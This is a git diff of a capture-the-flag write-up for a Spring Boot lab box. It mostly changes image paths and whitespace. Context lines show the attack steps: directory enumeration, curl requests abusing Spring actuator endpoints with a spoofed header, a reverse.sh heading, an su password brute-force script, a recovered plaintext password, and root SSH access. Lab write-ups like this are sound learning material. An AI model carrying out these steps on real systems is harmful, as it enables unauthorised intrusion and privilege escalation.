@@ -30,14 +30,6 @@
 gobuster dir -u https://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
 ```
 
-
-
-
-
-
-
-
-
 <figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
@@ -55,12 +47,6 @@ gobuster dir -u https://spring.thm -w /usr/share/wordlists/SecLists/Discovery/We
 ```
 
 <figure><img src="../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-
 
 **Kali**
 
@@ -133,7 +119,7 @@ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.1
 curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 **reverse.sh**
 
@@ -175,7 +161,7 @@ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.1
 
 
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Get autocomplete
 
@@ -195,7 +181,7 @@ We found one password within environment variables
 env
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -272,7 +258,7 @@ chmod +x su_brute_force.sh
 time bash su_brute_force.sh capitalized_words.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -281,7 +267,7 @@ su johnsmith
 Password: PrettyS3cureAccountPassword123.
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -356,5 +342,5 @@ ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
 bash getroot.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
